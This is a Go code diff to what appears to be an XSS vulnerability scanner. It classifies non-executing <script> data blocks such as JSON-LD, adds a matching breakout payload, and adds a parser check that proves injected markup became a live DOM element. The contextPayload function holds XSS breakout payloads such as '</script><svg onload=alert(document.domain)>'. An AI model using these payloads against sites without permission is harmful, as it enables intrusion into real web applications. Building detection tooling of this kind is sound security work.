@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"net/url"
+	"regexp"
 	"strings"
 
 	xhtml "golang.org/x/net/html"
@@ -37,6 +38,18 @@ const (
 	CtxRCDATA       = "rcdata"  // inside <textarea>/<title>
 	CtxRAWTEXT      = "rawtext" // inside <xmp>/<noembed>/<iframe>/<noframes>
 	CtxSrcDoc       = "srcdoc"  // nested HTML document inside iframe[srcdoc]
+	// CtxScriptData is a <script type="..."> whose type is NOT a JS-executable
+	// MIME type (application/json, application/ld+json, text/plain, a
+	// templating library's own custom type, ...). The HTML tokenizer still
+	// parses its content as raw text up to the literal </script> — exactly
+	// like CtxRAWTEXT — but the browser never executes it as JavaScript, so a
+	// bare JS-string/expression quote-breakout (CtxJSString/CtxJSExpr's
+	// executability rule) does nothing here; only a genuine </script> + new-
+	// element breakout does. A very common, entirely legitimate real-world
+	// shape (JSON-LD structured data, Vue/Handlebars-style inline templates)
+	// that the undifferentiated "any <script> is a JS context" classification
+	// previously mislabelled as executable from quote-survival alone.
+	CtxScriptData = "script_data"
 )
 
 // xssProbe is a unique marker followed by the four key breakout characters.
@@ -228,10 +241,12 @@ func analyzeReflectionAt(body string, idx int, marker, suffix string) Reflection
 		a.Executable = (a.Quote != 0 && strings.Contains(a.Surviving, string(a.Quote))) ||
 			((strings.Contains(a.Surviving, "<") || strings.Contains(a.Decoded, "<")) &&
 				(strings.Contains(a.Surviving, ">") || strings.Contains(a.Decoded, ">")))
-	case CtxComment, CtxRCDATA, CtxRAWTEXT:
-		// Break out of the comment (-->) or raw-text element (</textarea>) into HTML
-		// text; both require the angle brackets to survive UNENCODED to form the
-		// breakout sequence and a fresh element.
+	case CtxComment, CtxRCDATA, CtxRAWTEXT, CtxScriptData:
+		// Break out of the comment (-->), raw-text element (</textarea>), or
+		// non-executing script data block (</script>) into HTML text; all three
+		// require the angle brackets to survive UNENCODED to form the breakout
+		// sequence and a fresh element — a bare quote-breakout alone does nothing
+		// in any of them, unlike a genuinely JS-executing CtxJSString/CtxJSExpr.
 		a.Executable = strings.Contains(a.Surviving, "<") && strings.Contains(a.Surviving, ">")
 	}
 	// Mixed encoding is common: one irrelevant character may be encoded while the
@@ -335,6 +350,46 @@ var urlAttrs = map[string]bool{
 	"longdesc": true, "xlink:href": true, "srcset": true, "ping": true,
 }
 
+// scriptTypeAttrRe extracts a complete <script ...> opening tag's type
+// attribute value (quoted or bare). Safe to use a simple regex here — unlike
+// the marker-interrupted tag parsing classifyOpenTag does, this always runs
+// against a COMPLETE, already-closed opening tag.
+var scriptTypeAttrRe = regexp.MustCompile(`(?i)\btype\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))`)
+
+// scriptTagTypeAttr extracts openTag's type attribute value, or "" if absent.
+func scriptTagTypeAttr(openTag string) string {
+	m := scriptTypeAttrRe.FindStringSubmatch(openTag)
+	if m == nil {
+		return ""
+	}
+	for _, g := range m[1:] {
+		if g != "" {
+			return g
+		}
+	}
+	return ""
+}
+
+// scriptIsJSExecutable reports whether a <script> element's type attribute
+// value makes a browser execute its content as JavaScript. An absent/empty
+// type, "module", and every standard JavaScript MIME type all execute;
+// anything else — application/json, application/ld+json, text/plain, a
+// client-side templating library's own custom type — is a non-executing data
+// block the browser parses as plain text and never runs.
+func scriptIsJSExecutable(typeAttr string) bool {
+	switch strings.TrimSpace(strings.ToLower(typeAttr)) {
+	case "", "module",
+		"text/javascript", "application/javascript", "application/ecmascript",
+		"application/x-ecmascript", "application/x-javascript", "text/ecmascript",
+		"text/javascript1.0", "text/javascript1.1", "text/javascript1.2",
+		"text/javascript1.3", "text/javascript1.4", "text/javascript1.5",
+		"text/jscript", "text/livescript", "text/x-ecmascript", "text/x-javascript":
+		return true
+	default:
+		return false
+	}
+}
+
 // classifyContext determines the context from the text PRECEDING the marker, the
 // (attribute) quote char, and (for RCDATA) the close tag needed to break out.
 type reflectionContextDetails struct {
@@ -367,6 +422,13 @@ func classifyContextDetails(before string) reflectionContextDetails {
 		tagEnd := strings.IndexByte(before[lastScript:], '>')
 		if tagEnd < 0 {
 			return classifyOpenTag(before[lastScript:])
+		}
+		// A non-JS-executable type (application/json, application/ld+json, a
+		// templating library's own type, ...) is parsed as raw text up to the
+		// literal </script> — see CtxScriptData's doc comment.
+		openTag := before[lastScript : lastScript+tagEnd+1]
+		if !scriptIsJSExecutable(scriptTagTypeAttr(openTag)) {
+			return reflectionContextDetails{kind: CtxScriptData, closeTag: "</script>"}
 		}
 		// inside JS. string if an odd number of unescaped quotes precede us.
 		seg := before[lastScript+tagEnd+1:]
@@ -869,6 +931,10 @@ func contextPayload(ctxName string) string {
 		return `</textarea></title><svg onload=alert(document.domain)>`
 	case CtxRAWTEXT:
 		return `</xmp></noembed></iframe></noframes><svg onload=alert(document.domain)>`
+	case CtxScriptData:
+		// Non-executing script data block (JSON-LD, a templating type, ...): the
+		// HTML tokenizer still ends it on a literal </script>, independent of type.
+		return `</script><svg onload=alert(document.domain)>`
 	case CtxSrcDoc:
 		return `&lt;svg onload=alert(document.domain)&gt;`
 	default:
@@ -905,6 +971,42 @@ func htmlTagInjected(body, name string) bool {
 	walk = func(n *xhtml.Node) bool {
 		if n.Type == xhtml.ElementNode && strings.EqualFold(n.Data, name) {
 			return true
+		}
+		for ch := n.FirstChild; ch != nil; ch = ch.NextSibling {
+			if walk(ch) {
+				return true
+			}
+		}
+		return false
+	}
+	return walk(doc)
+}
+
+// htmlAttrInjected reports whether body, parsed with the same real HTML5
+// parser model as htmlTagInjected, contains an element named tag with an
+// attribute named attr whose value is EXACTLY wantValue. This proves the
+// injected markup genuinely became a live, parsed DOM node — as opposed to
+// merely surviving as inert bytes somewhere in the response (for example
+// inside a <script>/JSON data block, a <textarea>, or a comment, none of
+// which the HTML tokenizer treats as a tag boundary). A payload landing in
+// one of those inert contexts can satisfy a plain substring search while
+// never actually creating the element a real browser would execute, which
+// is exactly the gap this closes for storedxss.go's persistence proof.
+func htmlAttrInjected(body, tag, attr, wantValue string) bool {
+	doc, err := xhtml.Parse(strings.NewReader(body))
+	if err != nil {
+		return false
+	}
+	tag = strings.ToLower(strings.TrimSpace(tag))
+	attr = strings.ToLower(strings.TrimSpace(attr))
+	var walk func(*xhtml.Node) bool
+	walk = func(n *xhtml.Node) bool {
+		if n.Type == xhtml.ElementNode && strings.EqualFold(n.Data, tag) {
+			for _, a := range n.Attr {
+				if strings.EqualFold(a.Key, attr) && a.Val == wantValue {
+					return true
+				}
+			}
 		}
 		for ch := n.FirstChild; ch != nil; ch = ch.NextSibling {
 			if walk(ch) {
